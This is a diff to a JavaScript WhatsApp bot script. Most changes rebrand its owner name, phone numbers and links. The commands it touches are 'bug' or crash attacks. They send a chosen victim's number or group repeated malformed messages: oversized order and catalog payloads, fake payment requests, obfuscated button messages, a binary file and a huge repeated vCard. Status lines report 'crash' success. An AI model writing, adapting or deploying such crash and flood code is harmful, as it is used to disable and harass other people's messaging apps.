 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -847,10 +847,10 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"message": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
-"orderTitle": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
-"sellerJid": "6282264181831@s.whatsapp.net",
+"orderTitle": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
+"sellerJid": "17077706888@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR",
@@ -866,7 +866,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -874,18 +874,18 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
-"description": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+"title": `© v${ngazap(prefix)}`,
+"description": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,
 "currencyCode": "IDR",
-"footerText": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+"footerText": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,
 "priceAmount1000": "10000000",
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ WE ARE NOT MASTOD`,
-"url": "wa.me/6282264181831"
+"retailerId": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 WE ARE NOT MASTOD`,
+"url": "wa.me/17077706888"
 },
-"businessOwnerJid": "6282264181831@s.whatsapp.net",
+"businessOwnerJid": "17077706888@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -906,16 +906,16 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
-"description": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+"title": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
+"description": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,
 "currencyCode": "IDR",
-"footerText": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+"footerText": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,
 "productImageCount": 1,
 "firstImageId": 1,
-"retailerId": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ WE ARE NOT MASTOD`,
-"url": "wa.me/6282264181831"
+"retailerId": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 WE ARE NOT MASTOD`,
+"url": "wa.me/17077706888"
 },
-"businessOwnerJid": "6282264181831@s.whatsapp.net",
+"businessOwnerJid": "17077706888@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -925,18 +925,18 @@ m.reply(tekteka)
 }
 break
 //=================================================//
-case 'jagoandio' : {
+case 'jagoanbangsat' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `Hallo Aku 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
-haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}}}}, { quoted:doc})
 }
@@ -944,7 +944,7 @@ thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg',
 break
 //=================================================//
 /*BUG WACAP */
-case 'dioskuy' : {
+case 'satrianyskuy' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
@@ -969,7 +969,7 @@ await sleep(20)
 break
 //=================================================//
 /*BUG WACAP */
-case 'ampas2' : {
+case 'pftt' : {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
@@ -999,9 +999,9 @@ if (!isCreator) return
 mm = text.split("|")[0]+'@s.whatsapp.net'
 jumlah = text.split("|")[1]
 let secon = text.split("|")[2]
-a = await deploy(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
+a = await deploy(`Done crash stah [ 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ] ${mm} Sebanyak ${jumlah} waktu ${secon} detik`)
 for (let i = 0; i < jumlah ; i++){
-function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20HW\x20MODS\x20WA','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','HW\x20MODS\x20WA','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6281214281312','8702696DrukdN','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','6017EGBulL','1073458pGrfkv','6dptURc','6282264181831','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
+function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20HW\x20MODS\x20WA','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','HW\x20MODS\x20WA','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','17077706888','8702696DrukdN','https://chat.whatsapp.com/HS60XQGkSGU8DDajsEaKNr','6017EGBulL','1073458pGrfkv','6dptURc','17077706888','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
   await sleep(10000* secon)
 }
 }
@@ -1009,14 +1009,14 @@ break
 
 
 //=================================================//
-case '🌷':{
+case '🗿':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `Hi Iam 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
-function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6281214281312','771192XPifQJ','6282264181831','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20HW\x20MODS\x20WA','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'HW\x20MODS\x20WA','id':_0x47bf3a(0x153)}}]}));
+function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','17077706888','771192XPifQJ','17077706888','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/HS60XQGkSGU8DDajsEaKNr','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'Group\x20𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦\x20𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦\x20𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦\x20𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦\x20𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦','id':_0x47bf3a(0x153)}}]}));
  await sleep(20)
 }
 }
@@ -1027,7 +1027,7 @@ if (isBan) throw sticBanLu(from)
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-m.reply(`${m.pushName} Hello Saya Bot 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${text ? ': ' + text : ''}`)
+m.reply(`${m.pushName} Hello Saya Bot 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
@@ -1036,7 +1036,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
 key: { 
@@ -1061,7 +1061,7 @@ participant: `0@s.whatsapp.net`,
 }
 }})
 }
-deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
+deploy(`Done Stah ${jumlah}`)
 }
 break
 //=================================================//
@@ -1080,7 +1080,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {document: thumb},{quoted: {
 key: {
@@ -1095,13 +1095,13 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,
+"fileName": `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 }
 }
 }})
 }
-deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
+deploy(`Done Stah  ${jumlah}`)
 }
 break
 //=================================================//
@@ -1110,14 +1110,14 @@ if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
 let anu = await store.chats.all().map(v => v.id)
-let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
+let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
 m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
 for (let i of anu) {
 await sleep(1500)
 let butoon = [{
 urlButton: {
-displayText: `GITHUB`,
-url: 'https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA'
+displayText: `Youtube`,
+url: 'https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg'
 }
 },
 {
@@ -1167,7 +1167,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 const buttons = [
 {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
@@ -1175,7 +1175,7 @@ const buttons = [
 {buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
 ]
 const buttonMessage = {
-text: "寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎",
+text: "𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦",
 footerText: 'Pe',
 buttons: buttons,
 headerType: 1
@@ -1197,10 +1197,10 @@ if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
-haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${ngazap(prefix)}.BIN`, title: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${ngazap(prefix)}.BIN` }, { quoted: doc })
+haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${ngazap(prefix)}.BIN`, title: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${ngazap(prefix)}.BIN` }, { quoted: doc })
 }
 }
 break
@@ -1210,9 +1210,9 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
- const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 